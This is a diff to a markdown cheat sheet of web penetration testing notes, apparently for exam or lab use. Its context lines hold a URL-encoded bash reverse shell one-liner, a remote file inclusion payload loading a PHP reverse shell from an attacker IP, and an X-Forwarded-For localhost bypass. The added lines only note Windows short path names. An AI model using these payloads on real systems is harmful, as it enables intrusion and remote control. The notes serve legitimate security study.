@@ -35,6 +35,9 @@
 - Header poison URL may differs from Log Poisoning 
 - TCP reverse shell one-liner
   ``` bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 ```
+### Interesting file path
+1. [Windows] Progra~1 = program files | Progra~2 = program files (x86)
+
 ### WAF?
 1. Only Local host:
 - Try adding ``` X-Forwarded-For: 127.0.0.1 ```
@@ -52,6 +55,8 @@
 - RFI request to the website
   
   ``` ?page=http://{ip}/php-reverse-shell.php ```
+
+
 
 # File Upload Vuln
  
